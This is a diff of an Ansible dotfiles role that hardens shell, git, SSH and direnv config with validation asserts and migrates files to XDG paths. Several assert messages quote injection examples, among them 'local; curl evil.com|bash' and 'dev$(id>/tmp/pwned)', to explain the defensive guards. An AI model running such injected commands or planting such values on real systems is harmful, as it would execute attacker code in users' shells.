@@ -2,238 +2,567 @@
 # roles/dotfiles/tasks/main.yml
 # Deploy configuration files (copy + template), OS-conditional.
 
+# --- Pre-role validation (defense-in-depth: protects against --start-at-task / --skip-tags always bypass) ---
+- name: Assert dotfiles_user_name contains no newlines or control characters (INI injection guard)
+  vars:
+    _user_name_pattern: '^[^\n\r\x00-\x1f]*$'
+  ansible.builtin.assert:
+    that:
+      - dotfiles_user_name | string is match(_user_name_pattern)
+    fail_msg: >-
+      SECURITY: dotfiles_user_name (from environment, -e flag, or config.yml) contains
+      newlines or control characters. This value is rendered verbatim into the [user] name field
+      in .gitconfig (INI format); embedded newlines break INI section parsing and allow injection
+      of arbitrary git configuration directives. An attacker-controlled dotfiles_user_name like
+      'Attacker\n[core]\nbare=true' causes git to parse additional INI sections and set core.bare=true,
+      which transforms the repository into a bare repository. This can alter git behavior or override
+      security settings. Allowed: any printable characters except newlines (LF/CR) and control
+      characters (0x00-0x1F). Remove any embedded newlines or control characters from dotfiles_user_name.
+  tags: [always]
+
+- name: Assert AWS_PROFILE, GONOSUMDB, GOPRIVATE contain no shell metacharacters (shell injection guard)
+  vars:
+    _shell_metacharacters: '[$()`;&|<>]'
+  ansible.builtin.assert:
+    that:
+      - dotfiles_aws_profile | default('') | regex_search(_shell_metacharacters) is none
+      - dotfiles_gonosumdb | default('') | regex_search(_shell_metacharacters) is none
+      - dotfiles_goprivate | default('') | regex_search(_shell_metacharacters) is none
+    fail_msg: >-
+      SECURITY: dotfiles_aws_profile, dotfiles_gonosumdb, or dotfiles_goprivate (from config.yml)
+      contains shell metacharacters: $()`, ;, &, |, <, or >. These values are exported as
+      environment variables in bashrc/zshrc and sourced by the shell. An attacker-controlled value
+      like 'dev$(id>/tmp/pwned)' allows shell command injection via $() substitution, even with
+      quotes. Allowed: alphanumeric, dash, underscore, period, comma, and @ characters only.
+      Remove any shell metacharacters from these variables.
+  tags: [always]
+
+- name: Assert packages_gotoolchain matches allowed GOTOOLCHAIN values (shell injection guard)
+  vars:
+    _gotoolchain_pattern: '^(auto|local|go[0-9]+\.[0-9]+(\.[0-9]+)?)$'
+  ansible.builtin.assert:
+    that:
+      - packages_gotoolchain | string is match(_gotoolchain_pattern)
+    fail_msg: >-
+      SECURITY: packages_gotoolchain (from config.yml or -e flag) does not match the allowed
+      GOTOOLCHAIN values: 'auto', 'local', or 'goX.Y[.Z]' (e.g. go1.21.0). This value is
+      rendered unquoted into bashrc/zshrc as 'export GOTOOLCHAIN=<value>' and executed on
+      every interactive shell start. A value like 'local; curl evil.com|bash' would execute
+      arbitrary commands. Allowed values: auto, local, go1.21, go1.21.0, etc.
+  tags: [always]
+
+
+- name: Ensure user config directories exist
+  ansible.builtin.file:
+    path: "{{ item.path }}"
+    state: directory
+    mode: "{{ item.mode }}"
+  loop:
+    - {path: "{{ ansible_facts['user_dir'] }}/.local/state/zsh", mode: "0700"}
+    - {path: "{{ ansible_facts['user_dir'] }}/tmp", mode: "0700"}
+    - {path: "{{ ansible_facts['user_dir'] }}/.config/gh", mode: "0700"}
+    - {path: "{{ ansible_facts['user_dir'] }}/.ssh", mode: "0700"}
+    - {path: "{{ ansible_facts['user_dir'] }}/.config/ripgrep", mode: "0755"}
+    - {path: "{{ ansible_facts['user_dir'] }}/.config/tmux", mode: "0755"}
+    - {path: "{{ ansible_facts['user_dir'] }}/.config/direnv", mode: "0755"}
+    - {path: "{{ ansible_facts['user_dir'] }}/.config/user-tmpfiles.d", mode: "0755"}
+
+- name: Stat legacy ~/.zsh_history (pre-XDG location)
+  ansible.builtin.stat:
+    path: "{{ ansible_facts['user_dir'] }}/.zsh_history"
+  register: _dotfiles_legacy_zsh_history
+
+- name: Stat XDG zsh history (new location)
+  ansible.builtin.stat:
+    path: "{{ ansible_facts['user_dir'] }}/.local/state/zsh/history"
+  register: _dotfiles_xdg_zsh_history
+
+- name: Move ~/.zsh_history to XDG location (one-time migration)
+  ansible.builtin.command:
+    argv:
+      - mv
+      - "{{ ansible_facts['user_dir'] }}/.zsh_history"
+      - "{{ ansible_facts['user_dir'] }}/.local/state/zsh/history"
+  when:
+    - _dotfiles_legacy_zsh_history.stat.exists
+    - not _dotfiles_xdg_zsh_history.stat.exists
+  changed_when: true
+
+- name: Stat oh-my-zsh .git directory
+  ansible.builtin.stat:
+    path: "{{ ansible_facts['user_dir'] }}/.local/share/oh-my-zsh/.git"
+  register: _dotfiles_ohmyzsh_git
+
+- name: Remove oh-my-zsh directory if present without .git (corrupted or incomplete)
+  ansible.builtin.file:
+    path: "{{ ansible_facts['user_dir'] }}/.local/share/oh-my-zsh"
+    state: absent
+  when: not _dotfiles_ohmyzsh_git.stat.exists
+
 - name: Install oh-my-zsh
   ansible.builtin.git:
     repo: https://github.com/ohmyzsh/ohmyzsh.git
-    dest: "{{ ansible_user_dir }}/.oh-my-zsh"
-    depth: 1
-    version: "70ad5e3df8f7bed68aa6672029496926e632aedd"
-    update: false
+    dest: "{{ ansible_facts['user_dir'] }}/.local/share/oh-my-zsh"
+    version: "{{ dotfiles_ohmyzsh_version }}"
+    refspec: >-
+      {{ ('+' ~ dotfiles_ohmyzsh_version ~ ':refs/remotes/origin/laptop-setup-pinned')
+         if dotfiles_ohmyzsh_version is match('^[0-9a-fA-F]{40}$') else omit }}
+    depth: 100
+    update: true
+  register: dotfiles_ohmyzsh_result
+  until: dotfiles_ohmyzsh_result is succeeded
+  retries: 3
+  delay: 5
+  timeout: 120
+  # ignore_errors (not failed_when: false): .failed must remain True on clone failure —
+  # it guards the warning below and the legacy ~/.oh-my-zsh removal.
+  # failed_when: false would always set .failed=False, silently breaking that guard.
+  ignore_errors: true
+
+- name: Warn if oh-my-zsh clone failed
+  ansible.builtin.debug:
+    msg: "WARNING: oh-my-zsh clone failed (network issue?). Zsh config will deploy but OMZ features won't work until cloned."
+  when: dotfiles_ohmyzsh_result.failed
+
+- name: Forgit and legacy oh-my-zsh cleanup
+  when: not dotfiles_ohmyzsh_result.failed
+  block:
+    - name: Install forgit oh-my-zsh plugin (not bundled — requires separate clone)
+      ansible.builtin.git:
+        repo: https://github.com/wfxr/forgit.git
+        dest: "{{ ansible_facts['user_dir'] }}/.local/share/oh-my-zsh/custom/plugins/forgit"
+        version: "{{ dotfiles_forgit_version }}"
+        refspec: >-
+          {{ ('+' ~ dotfiles_forgit_version ~ ':refs/remotes/origin/laptop-setup-pinned')
+             if dotfiles_forgit_version is match('^[0-9a-fA-F]{40}$') else omit }}
+        depth: 1
+        update: true
+      register: dotfiles_forgit_result
+      until: dotfiles_forgit_result is succeeded
+      retries: 3
+      delay: 5
+      ignore_errors: true
+      timeout: 60
+
+    - name: Warn if forgit clone failed
+      ansible.builtin.debug:
+        msg: "WARNING: forgit plugin clone failed. Git fuzzy UI (glo, gcb, gd aliases) won't be available."
+      when: dotfiles_forgit_result.failed | default(false)
+
+    - name: Remove legacy ~/.oh-my-zsh (migrated to XDG path)
+      ansible.builtin.file:
+        path: "{{ ansible_facts['user_dir'] }}/.oh-my-zsh"
+        state: absent
 
 - name: Ensure macOS SSH sockets directory exists
   ansible.builtin.file:
-    path: "{{ ansible_user_dir }}/.ssh/sockets"
+    path: "{{ ansible_facts['user_dir'] }}/.ssh/sockets"
     state: directory
     mode: "0700"
-  when: ansible_system != 'Linux'
+  when: is_macos
 
-- name: Ensure Linux-only config directories exist
-  ansible.builtin.file:
-    path: "{{ item }}"
-    state: directory
-    mode: "0755"
-  loop:
-    - "{{ ansible_user_dir }}/.config/user-tmpfiles.d"
-    - "{{ ansible_user_dir }}/.config/environment.d"
-    - "{{ ansible_user_dir }}/.config/systemd/user"
-  when: ansible_system == 'Linux'
+- name: Check current login shell (zsh advisory probe)
+  ansible.builtin.shell:
+    cmd: |
+      set -o pipefail
+      getent passwd {{ ansible_facts['user_id'] }} | cut -d: -f7
+    executable: /bin/bash
+  register: _dotfiles_login_shell
+  changed_when: false
+  failed_when: false
+  check_mode: false  # read-only probe — must run in check mode
+  when: is_linux
 
-- name: Ensure private directories exist
-  ansible.builtin.file:
-    path: "{{ item }}"
-    state: directory
-    mode: "0700"
-  loop:
-    - "{{ ansible_user_dir }}/.local/run/tmux"
-
-- name: Ensure Claude config directory
-  ansible.builtin.file:
-    path: "{{ ansible_user_dir }}/.config/claude"
-    state: directory
-    mode: "0700"
+- name: Warn if login shell is not zsh (zshrc will be deployed but not reached on login)
+  ansible.builtin.debug:
+    msg: >-
+      ADVISORY: .zshrc is being deployed but the current login shell is
+      '{{ _dotfiles_login_shell.stdout | trim }}' (not /bin/zsh).
+      This role intentionally does not change the login shell (that is owned by the
+      desktop role). Run 'make desktop' or 'make all' to set /bin/zsh as the login
+      shell so that .zshrc is reached on login, then log out and back in.
+  when:
+    - is_linux
+    - _dotfiles_login_shell.stdout is defined
+    - _dotfiles_login_shell.stdout | trim != '/bin/zsh'
 
 - name: Deploy zshrc
   ansible.builtin.template:
     src: zshrc.j2
-    dest: "{{ ansible_user_dir }}/.zshrc"
+    dest: "{{ ansible_facts['user_dir'] }}/.zshrc"
     mode: "0644"
+
+- name: Migrate legacy dotfiles to XDG paths
+  ansible.builtin.include_tasks: xdg_migrate.yml
+  vars:
+    _legacy_path: '{{ item.legacy }}'
+    _backup_path: '{{ item.backup }}'
+  loop:
+    - {legacy: '~/.gitconfig', backup: '~/.gitconfig.pre-xdg-migration'}
+    - {legacy: '~/.tmux.conf', backup: '~/.tmux.conf.pre-xdg-migration'}
 
 - name: Deploy gitconfig
   ansible.builtin.template:
     src: gitconfig.j2
-    dest: "{{ ansible_user_dir }}/.gitconfig"
+    dest: "{{ ansible_facts['user_dir'] }}/.config/git/config"
     mode: "0644"
 
-- name: Deploy gitleaks pre-commit hook
-  ansible.builtin.copy:
-    dest: "{{ ansible_user_dir }}/.config/git/template/hooks/pre-commit"
-    mode: "0755"
-    content: |
-      #!/bin/sh
-      if command -v gitleaks >/dev/null 2>&1; then
-        gitleaks git --pre-commit --staged --redact --max-decode-depth 2
-      fi
+- name: Validate and deploy git allowed signers
+  when: ssh_git_signing_pubkey | trim | length > 0
+  block:
+    - name: Assert ssh_git_signing_pubkey contains no newlines or control characters
+      ansible.builtin.assert:
+        that:
+          - ssh_git_signing_pubkey | regex_search('[\x00-\x1f\x7f]') is none
+          - ssh_git_signing_pubkey is regex('^(ssh-|ecdsa-|sk-)[a-zA-Z0-9@._+-]+ [A-Za-z0-9+/]+={0,2}( [^\x00-\x1f\x7f]*)?$')
+        fail_msg: >-
+          ssh_git_signing_pubkey='{{ ssh_git_signing_pubkey }}' contains newlines,
+          control characters, or disallowed characters. SSH public keys must be single-line
+          and contain a key algorithm, base64 key, and optional comment. A newline would inject arbitrary entries into
+          ~/.config/git/allowed_signers,
+          allowing arbitrary signers (e.g., 'root') to forge commits. Correct config.yml or vault.yml.
 
-- name: Ensure gh config directory
+    - name: Deploy allowed signers file
+      ansible.builtin.template:
+        src: allowed_signers.j2
+        dest: "{{ ansible_facts['user_dir'] }}/.config/git/allowed_signers"
+        mode: "0644"
+
+- name: Find files in git hooks directory
+  ansible.builtin.find:
+    paths: "{{ ansible_facts['user_dir'] }}/.config/git/template/hooks"
+    file_type: file
+  register: _git_hooks_found
+
+- name: Remove unmanaged files from git hooks directory
   ansible.builtin.file:
-    path: "{{ ansible_user_dir }}/.config/gh"
-    state: directory
-    mode: "0700"
+    path: "{{ item.path }}"
+    state: absent
+  loop: "{{ _git_hooks_found.files }}"
+  when: item.path | basename not in ['pre-commit', 'commit-msg', 'prepare-commit-msg', 'pre-push']
 
-- name: Check if gh config exists
-  ansible.builtin.stat:
-    path: "{{ ansible_user_dir }}/.config/gh/config.yml"
-  register: dotfiles_gh_config
+- name: Deploy git template hooks
+  ansible.builtin.copy:
+    src: "{{ item }}"
+    dest: "{{ ansible_facts['user_dir'] }}/.config/git/template/hooks/{{ item | replace('git-template-', '') }}"
+    mode: "0755"
+  loop:
+    - git-template-pre-commit
+    - git-template-commit-msg
+    - git-template-prepare-commit-msg
+    - git-template-pre-push
+
+- name: Validate existing gh CLI config for non-standard aliases (security check)
+  when: is_linux or is_macos
+  block:
+    - name: Check if gh config exists
+      ansible.builtin.stat:
+        path: "{{ ansible_facts['user_dir'] }}/.config/gh/config.yml"
+      register: _gh_config_stat
+
+    - name: Read existing gh config if present
+      ansible.builtin.slurp:
+        path: "{{ ansible_facts['user_dir'] }}/.config/gh/config.yml"
+      register: _gh_config_content
+      when: _gh_config_stat.stat.exists
+
+    - name: Parse gh config YAML
+      ansible.builtin.set_fact:
+        _gh_config_parsed: "{{ _gh_config_content.content | b64decode | from_yaml }}"
+      when: _gh_config_stat.stat.exists
+
+    - name: Check for non-standard gh aliases (security)
+      ansible.builtin.assert:
+        that:
+          - _gh_config_parsed.aliases is not defined or
+            (_gh_config_parsed.aliases | dict2items | selectattr('key', 'ne', 'co') | list | length == 0)
+        fail_msg: >-
+          SECURITY WARNING: Existing gh CLI config at {{ ansible_facts['user_dir'] }}/.config/gh/config.yml
+          contains non-standard aliases beyond 'co'.
+          Detected aliases: {{ _gh_config_parsed.aliases | dict2items | map(attribute='key') | list }}.
+          Non-standard aliases may execute arbitrary shell commands (e.g., 'gh exploit' could run
+          'touch /tmp/gh_exploit'). Review the config manually and remove malicious entries:
+          cat {{ ansible_facts['user_dir'] }}/.config/gh/config.yml
+          Then re-run provisioning. If aliases are legitimate, add them to the dotfiles role template.
+      when:
+        - _gh_config_stat.stat.exists
+        - _gh_config_parsed is defined
 
 - name: Deploy gh CLI config
   ansible.builtin.copy:
     content: |
-      git_protocol: https
-      editor: vim
-      prompt: enabled
+      editor: {{ dotfiles_gh_editor }}
       aliases:
         co: pr checkout
-    dest: "{{ ansible_user_dir }}/.config/gh/config.yml"
+    dest: "{{ ansible_facts['user_dir'] }}/.config/gh/config.yml"
     mode: "0600"
-  when: not dotfiles_gh_config.stat.exists
+    force: false
 
 - name: Deploy git conditional includes
   ansible.builtin.template:
     src: "{{ item }}.j2"
-    dest: "{{ ansible_user_dir }}/.config/git/{{ item }}"
+    dest: "{{ ansible_facts['user_dir'] }}/.config/git/{{ item }}"
     mode: "0644"
   loop:
     - config-work
     - config-personal
 
+- name: Deploy global gitignore
+  ansible.builtin.copy:
+    src: gitignore_global
+    dest: "{{ ansible_facts['user_dir'] }}/.config/git/ignore"
+    mode: "0644"
+- name: Deploy ripgreprc
+  ansible.builtin.copy:
+    src: ripgreprc
+    dest: "{{ ansible_facts['user_dir'] }}/.config/ripgrep/config"
+    mode: "0644"
+    # seed-only — user edits not overwritten
+    force: false
+- name: Assert dotfiles_tmux_prefix contains no newlines or shell metacharacters
+  ansible.builtin.assert:
+    that:
+      - dotfiles_tmux_prefix | length > 0
+      - dotfiles_tmux_prefix is regex('^[CM]-[a-zA-Z][a-zA-Z0-9]*$')
+    fail_msg: >-
+      dotfiles_tmux_prefix='{{ dotfiles_tmux_prefix }}' must be a Ctrl or Meta key chord.
+      Valid patterns: C-a, M-b, C-Space, C-Enter. A newline or arbitrary string would inject
+      directives (e.g. run-shell) into tmux.conf. Correct config.yml.
 - name: Deploy tmux.conf
   ansible.builtin.template:
     src: tmux.conf.j2
-    dest: "{{ ansible_user_dir }}/.tmux.conf"
+    dest: "{{ ansible_facts['user_dir'] }}/.config/tmux/tmux.conf"
     mode: "0644"
 
 - name: Deploy vimrc
-  ansible.builtin.template:
-    src: vimrc.j2
-    dest: "{{ ansible_user_dir }}/.vimrc"
+  ansible.builtin.copy:
+    src: vimrc
+    dest: "{{ ansible_facts['user_dir'] }}/.vimrc"
     mode: "0644"
-
+    # seed-only — user edits not overwritten
+    force: false
 - name: Deploy bashrc
   ansible.builtin.template:
     src: bashrc.j2
-    dest: "{{ ansible_user_dir }}/.bashrc"
+    dest: "{{ ansible_facts['user_dir'] }}/.bashrc"
     mode: "0644"
+- name: Disable GNOME Keyring SSH agent (legacy autostart + GNOME 50+ systemd)
+  when: is_linux and needs_container_tier != 'container' and not system_is_container and not csb_rhel
+  block:
+    - name: Ensure autostart directory exists
+      ansible.builtin.file:
+        path: "{{ ansible_facts['user_dir'] }}/.config/autostart"
+        state: directory
+        mode: "0755"
 
-- name: Deploy SSH agent systemd user service
-  ansible.builtin.template:
-    src: ssh-agent.service.j2
-    dest: "{{ ansible_user_dir }}/.config/systemd/user/ssh-agent.service"
-    mode: "0644"
-  when: ansible_system == 'Linux'
+    - name: Disable GNOME Keyring SSH agent autostart (legacy XDG path)
+      ansible.builtin.copy:
+        content: |
+          [Desktop Entry]
+          Hidden=true
+        dest: "{{ ansible_facts['user_dir'] }}/.config/autostart/gnome-keyring-ssh.desktop"
+        mode: "0644"
 
-- name: Enable SSH agent user service
-  ansible.builtin.systemd:
-    name: ssh-agent
-    scope: user
-    state: started
-    enabled: true
-    daemon_reload: true
-  when: ansible_system == 'Linux'
-  failed_when: false
+    - name: Stop and mask gcr-ssh-agent (GNOME 50+ activates via gnome-session-services.target)
+      ansible.builtin.systemd:
+        name: "{{ item }}"
+        scope: user
+        state: stopped
+        masked: true
+      loop:
+        - gcr-ssh-agent.socket
+        - gcr-ssh-agent.service
+      failed_when: false
 
-- name: Deploy SSH agent environment.d config
+- name: Assert dotfiles_ssh_agent_timeout is a non-negative integer
+  ansible.builtin.assert:
+    that:
+      - dotfiles_ssh_agent_timeout | string is regex('^[0-9]+$')
+    fail_msg: >-
+      dotfiles_ssh_agent_timeout='{{ dotfiles_ssh_agent_timeout }}' must be a
+      non-negative integer (seconds). A non-numeric value would be coerced to 0
+      (unlimited lifetime) by ssh-agent. Correct config.yml.
+
+- name: SSH agent systemd user service
+  when: is_linux and not system_is_container  # containers lack ~/.config/systemd/user; user systemd scope unused
+  block:
+    - name: Deploy SSH agent systemd user service
+      ansible.builtin.template:
+        src: ssh-agent.service.j2
+        dest: "{{ ansible_facts['user_dir'] }}/.config/systemd/user/ssh-agent.service"
+        mode: "0644"
+      notify: Restart ssh-agent
+
+    - name: Enable SSH agent user service
+      ansible.builtin.systemd:
+        name: ssh-agent
+        scope: user
+        state: started
+        enabled: true
+        daemon_reload: true
+      register: _dotfiles_ssh_agent_enable
+      ignore_errors: true
+
+    - name: Warn if SSH agent enable failed
+      ansible.builtin.debug:
+        msg: >-
+          WARNING: SSH agent user service could not be enabled (no systemd --user?).
+          SSH_AUTH_SOCK will point to a non-existent socket until reboot into a full session.
+      when: _dotfiles_ssh_agent_enable.failed | default(false)
+
+    - name: Find all files in ~/.config/environment.d
+      ansible.builtin.find:
+        paths: "{{ ansible_facts['user_dir'] }}/.config/environment.d"
+        file_type: file
+        recurse: false
+      register: _dotfiles_envd_files
+
+    - name: Remove unmanaged files from ~/.config/environment.d (security remediation)
+      ansible.builtin.file:
+        path: "{{ item.path }}"
+        state: absent
+      loop: "{{ _dotfiles_envd_files.files }}"
+      when: item.path | basename not in ['ssh-agent.conf', 'gotmpdir.conf', 'containers.conf', 'terminal.conf', 'xdg.conf']
+      register: _dotfiles_envd_removed
+
+    - name: Warn on removed unmanaged files in ~/.config/environment.d  # noqa: no-handler — advisory must appear immediately after cleanup
+      ansible.builtin.debug:
+        msg: >-
+          SECURITY WARNING: Removed unmanaged file from ~/.config/environment.d:
+          {{ item.item.path }}. This file was not managed by this playbook and may
+          have been planted to hijack LD_PRELOAD, PATH, or other environment variables
+          loaded by systemd-environment-d-generator at login. The file has been removed
+          to restore a known-good state and unblock provisioning. Forensic investigation
+          recommended before next graphical login.
+      loop: "{{ _dotfiles_envd_removed.results }}"
+      when: item.changed | default(false)
+
+    - name: Deploy environment.d conf files
+      ansible.builtin.copy:
+        content: "SSH_AUTH_SOCK=${XDG_RUNTIME_DIR}/ssh-agent.socket\n"
+        dest: "{{ ansible_facts['user_dir'] }}/.config/environment.d/ssh-agent.conf"
+        mode: "0644"
+
+- name: Deploy Go environment.d conf (GOTMPDIR)
+  # go test compiles to TempDir then exec()s — /tmp may be noexec (nosuid mount on CSB/hardened hosts)
   ansible.builtin.copy:
-    content: "SSH_AUTH_SOCK=${XDG_RUNTIME_DIR}/ssh-agent.socket\n"
-    dest: "{{ ansible_user_dir }}/.config/environment.d/ssh-agent.conf"
+    content: "GOTMPDIR=$HOME/tmp\n"
+    dest: "{{ ansible_facts['user_dir'] }}/.config/environment.d/gotmpdir.conf"
     mode: "0644"
-  when: ansible_system == 'Linux'
+  when: is_linux and not system_is_container
 
 # --- macOS: SSH agent via launchd ---
-- name: Disable Apple built-in ssh-agent (macOS)  # noqa: command-instead-of-module
-  ansible.builtin.command:
-    cmd: "launchctl disable user/{{ ansible_user_uid }}/com.openssh.ssh-agent"
-  changed_when: false
-  failed_when: false
-  when: ansible_os_family == 'Darwin'
+- name: SSH agent launchd setup (macOS)
+  when: is_macos
+  block:
+    - name: Disable Apple built-in ssh-agent (macOS)  # noqa: command-instead-of-module
+      ansible.builtin.command:
+        cmd: "launchctl disable user/{{ ansible_facts['user_uid'] }}/com.openssh.ssh-agent"
+      changed_when: false
+      failed_when: false
 
-- name: Ensure log directory exists (macOS)
-  ansible.builtin.file:
-    path: "{{ ansible_user_dir }}/.local/share/log"
-    state: directory
-    mode: "0755"
-  when: ansible_os_family == 'Darwin'
+    - name: Ensure SSH agent support directories exist (macOS)
+      ansible.builtin.file:
+        path: "{{ item }}"
+        state: directory
+        mode: "0755"
+      loop:
+        - "{{ ansible_facts['user_dir'] }}/.local/state/log"
+        - "{{ ansible_facts['user_dir'] }}/Library/LaunchAgents"
 
-- name: Deploy SSH agent launchd plist (macOS)
-  ansible.builtin.template:
-    src: ssh-agent.plist.j2
-    dest: "{{ ansible_user_dir }}/Library/LaunchAgents/com.dfarrell07.ssh-agent.plist"
-    mode: "0644"
-  when: ansible_os_family == 'Darwin'
+    - name: Deploy SSH agent launchd plist (macOS)
+      ansible.builtin.template:
+        src: ssh-agent.plist.j2
+        dest: "{{ ansible_facts['user_dir'] }}/Library/LaunchAgents/com.{{ dotfiles_github_user }}.ssh-agent.plist"
+        mode: "0644"
+      notify: Reload ssh-agent launchd (macOS)
 
-- name: Load SSH agent launchd plist (macOS)  # noqa: command-instead-of-module
-  ansible.builtin.command:
-    cmd: "launchctl load -w {{ ansible_user_dir }}/Library/LaunchAgents/com.dfarrell07.ssh-agent.plist"
-  when: ansible_os_family == 'Darwin'
-  changed_when: false
-  failed_when: false
+    - name: Load SSH agent launchd plist (macOS)  # noqa: command-instead-of-module
+      # 'launchctl bootstrap' is the modern replacement for the deprecated
+      # 'launchctl load -w' (deprecated since macOS 10.10 Yosemite).
+      # rc==0 means newly bootstrapped (changed); rc!=0 means already running (no change).
+      # failed_when: false handles the non-zero exit when the agent is already bootstrapped.
+      ansible.builtin.command:
+        cmd: >-
+          launchctl bootstrap gui/{{ ansible_facts['user_uid'] }}
+          {{ ansible_facts['user_dir'] }}/Library/LaunchAgents/com.{{ dotfiles_github_user }}.ssh-agent.plist
+      register: _dotfiles_ssh_agent_bootstrap_result
+      changed_when: _dotfiles_ssh_agent_bootstrap_result.rc == 0
+      failed_when: false
 
 - name: Check if SSH supports post-quantum KEX
-  ansible.builtin.command: ssh -Q kex
+  ansible.builtin.command:
+    cmd: ssh -Q kex
   register: dotfiles_ssh_kex_check
   changed_when: false
   failed_when: false
+  check_mode: false  # read-only probe — must run in check mode to avoid false-positive diff
 
 - name: Set PQ KEX availability fact
   ansible.builtin.set_fact:
-    dotfiles_ssh_kex_pq_enabled: "{{ 'mlkem768x25519-sha256' in (dotfiles_ssh_kex_check.stdout | default('')) }}"
+    dotfiles_ssh_kex_pq_enabled: >-  # yamllint disable-line rule:line-length
+      {{ 'mlkem768x25519-sha256' in dotfiles_ssh_kex_check.stdout_lines and 'sntrup761x25519-sha512' in
+      dotfiles_ssh_kex_check.stdout_lines }}
+
+- name: Assert real_user_id matches valid Linux username character set
+  ansible.builtin.assert:
+    that:
+      - real_user_id | default('') | length > 0
+      - real_user_id is regex('^[a-z_][a-z0-9_.@-]{0,31}$')
+    fail_msg: >-
+      real_user_id='{{ real_user_id | default("(empty)") }}' contains characters
+      outside the allowed set or is empty. A newline or space in USER would inject
+      arbitrary directives into ~/.ssh/config. Correct the USER environment variable
+      before re-running.
+  when: profile == 'work'
+  tags: [always]
 
 - name: Deploy SSH client config
   ansible.builtin.template:
     src: ssh_config.j2
-    dest: "{{ ansible_user_dir }}/.ssh/config"
+    dest: "{{ ansible_facts['user_dir'] }}/.ssh/config"
     mode: "0600"
+- name: Deploy socket tmpfiles configs and runtime dirs
+  when: is_linux and not system_is_container  # tmpfiles/session-runtime not available in containers
+  block:
+    - name: Deploy socket tmpfiles configs (ssh, tmux)
+      ansible.builtin.copy:
+        content: "d %t/{{ item }} 0700 - - -\n"
+        dest: "{{ ansible_facts['user_dir'] }}/.config/user-tmpfiles.d/{{ item }}-sockets.conf"
+        mode: "0644"
+      loop: [ssh, tmux]
 
-- name: Deploy SSH socket tmpfiles config
-  ansible.builtin.copy:
-    content: "d %t/ssh 0700 - - -\n"
-    dest: "{{ ansible_user_dir }}/.config/user-tmpfiles.d/ssh-sockets.conf"
-    mode: "0644"
-  when: ansible_system == 'Linux'
+    # /run/user/$UID is a tmpfs cleared on reboot; the user-tmpfiles.d configs deployed
+    # above recreate these dirs on every login via systemd-tmpfiles. These tasks only
+    # ensure the dirs exist immediately during the current Ansible session (before reboot).
+    # The file module truthfully reports changed when the dir is absent and must be created.
+    - name: Create socket directories in XDG runtime dir
+      ansible.builtin.file:
+        path: "/run/user/{{ ansible_facts['user_uid'] }}/{{ item }}"
+        state: directory
+        mode: "0700"
+      loop: [ssh, tmux]
+      failed_when: false
 
-- name: Activate tmpfiles to create SSH socket directory
-  ansible.builtin.command:
-    cmd: systemd-tmpfiles --user --create
-  changed_when: false
-  when: ansible_system == 'Linux'
-
-- name: Ensure direnv config directory
-  ansible.builtin.file:
-    path: "{{ ansible_user_dir }}/.config/direnv"
-    state: directory
-    mode: "0755"
+- name: Assert dotfiles_direnv_warn_timeout is a valid direnv timeout
+  ansible.builtin.assert:
+    that:
+      - dotfiles_direnv_warn_timeout is regex('^[0-9]+[smh]$')
+    fail_msg: >-
+      dotfiles_direnv_warn_timeout='{{ dotfiles_direnv_warn_timeout }}' must be
+      a valid direnv timeout format (e.g. '10s', '5m', '1h'). Invalid characters
+      would break the direnv.toml TOML syntax and prevent direnv from loading.
+      Correct config.yml.
 
 - name: Deploy safe direnv config
-  ansible.builtin.copy:
-    content: |
-      [global]
-      strict_env = true
-      disable_stdin = true
-      warn_timeout = "10s"
-    dest: "{{ ansible_user_dir }}/.config/direnv/direnv.toml"
+  ansible.builtin.template:
+    src: direnv.toml.j2
+    dest: "{{ ansible_facts['user_dir'] }}/.config/direnv/direnv.toml"
     mode: "0644"
-
-- name: Set .npmrc permissions if exists
-  ansible.builtin.file:
-    path: "{{ ansible_user_dir }}/.npmrc"
-    mode: "0600"
-  failed_when: false
-
-- name: Harden credential directory permissions
-  ansible.builtin.file:
-    path: "{{ item }}"
-    mode: "0700"
-  loop:
-    - "{{ ansible_user_dir }}/.aws"
-    - "{{ ansible_user_dir }}/.config/gcloud"
-    - "{{ ansible_user_dir }}/.kube"
-  failed_when: false
-
-- name: Deploy Claude work-env file
+- name: Deploy direnv user stdlib (direnvrc with layout_go)
   ansible.builtin.copy:
-    content: |
-      export CLAUDE_CONFIG_DIR=~/.claude-work
-      export CLAUDE_CODE_USE_VERTEX=1
-      # Vertex project vars — set in CLAUDE.local.md, not here
-    dest: "{{ ansible_user_dir }}/.config/claude/work-env"
-    mode: "0600"
-  when: profile == 'work'
+    src: direnvrc
+    dest: "{{ ansible_facts['user_dir'] }}/.config/direnv/direnvrc"
+    mode: "0644"
+    # seed-only — user edits not overwritten
+    force: false
